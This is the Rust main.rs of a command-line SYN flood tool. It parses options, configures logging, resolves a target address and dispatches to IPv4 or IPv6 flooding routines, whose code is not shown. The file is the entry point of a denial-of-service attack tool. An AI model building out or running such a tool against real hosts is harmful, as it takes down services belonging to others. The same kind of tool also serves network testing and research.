#![feature(ip)]
#![feature(duration_float)]

pub mod error;
pub mod option;
pub mod procedure;
pub mod random;
pub mod runner;

use error::SynFloodError;
use log::{debug, error, info, LevelFilter};
use option::Opt;
use std::{env, net::SocketAddr};
use structopt::StructOpt;

fn main() {
    let opt = Opt::from_args();
    {
        let default_level = if opt.debug {
            LevelFilter::Trace
        } else {
            LevelFilter::Info
        };
        initialize_logger(default_level);
    }
    debug!("dump options: {:?}", opt);

    if let Err(e) = syn_flood_main(opt) {
        error!("{}", e);
        std::process::exit(1);
    }
}

fn initialize_logger(default_level: LevelFilter) {
    use env_logger::Builder;
    let mut builder = Builder::new();
    builder.filter(Some("syn_flood"), default_level);

    if let Ok(log_var) = env::var("RUST_LOG") {
        builder.parse_filters(&log_var);
    }

    builder.init();
}

fn syn_flood_main(option: Opt) -> Result<(), SynFloodError> {
    // resolve socket addresses and select one
    let addr = procedure::resolve_destination(&option)?;
    info!("use first usable destination socket address: {}", addr);
    match addr {
        SocketAddr::V4(addr) => procedure::flood_v4(&option, &addr),
        SocketAddr::V6(addr) => procedure::flood_v6(&option, &addr),
    }
}
